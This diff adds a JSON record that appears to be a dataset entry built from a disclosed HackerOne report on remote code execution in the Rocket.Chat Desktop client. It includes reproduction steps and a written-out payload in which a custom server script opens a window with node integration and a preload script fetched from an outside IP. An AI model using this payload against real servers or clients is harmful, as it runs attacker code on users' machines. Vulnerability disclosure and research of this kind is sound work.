@@ -1,0 +1,50 @@
+{
+    "reported_to": "Rocket.Chat",
+    "reported_by": "sectex ",
+    "title": "Remote Code Execution in Rocket.Chat-Desktop",
+    "content": "\nDescription: Rocket.Chat-Desktop is vulnerable to remote code execution.\nAn attacker is able to create new BrowserWindow instances with a malicious preload script.\nReleases Affected:\nRocket.Chat-Desktop-Client: < v3.0.0-develop\nSteps To Reproduce (by setting up a malicious server):\nGo to Administration \u00bb Layout \u00bb Custom Scripts \u00bb Custom Script for Logged In Users\nInsert the following script: window.open('data:text/html,<h1>PWNED</h1>', '', ['nodeIntegration=true', 'preload=\\\\\\\\45.155.173.235\\\\data\\\\cmd.js'].join(','))\nClick Save changes\nOpen Rocket.Chat-Desktop and connect to the server\nCMD.exe will pop up.\nSuggested mitigation\nconst wrapWindowOpen = (defaultWindowOpen) => (href, frameName, features) => {\n\nImpact\nRemote Code Execution in Rocket.Chat-Desktop\n\n",
+    "severity": [
+        9.0,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1604778000,
+    "report_url": "https://hackerone.com/reports/943725",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Go to Administration \u00bb Layout \u00bb Custom Scripts \u00bb Custom Script for Logged In Users"
+        ],
+        [
+            2,
+            "Insert the malicious script: window.open('data:text/html,<h1>PWNED</h1>', '', ['nodeIntegration=true', 'preload=\\\\45.155.173.235\\data\\cmd.js'].join(','))"
+        ],
+        [
+            3,
+            "Click Save changes"
+        ],
+        [
+            4,
+            "Open Rocket.Chat-Desktop and connect to the server"
+        ],
+        [
+            5,
+            "Observe CMD.exe popping up"
+        ]
+    ],
+    "vuln_description": "Rocket.Chat-Desktop is vulnerable to remote code execution via malicious preload scripts in new BrowserWindow instances. An attacker can exploit this by injecting a script through the server's custom script feature, which executes arbitrary code on the client side.",
+    "reason": "The vulnerability involves understanding the interaction between the server's custom script injection and the client's handling of preload scripts with nodeIntegration enabled. While the attack chain is straightforward once the components are identified, the initial discovery requires knowledge of Electron's security model and the specific Rocket.Chat-Desktop implementation.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
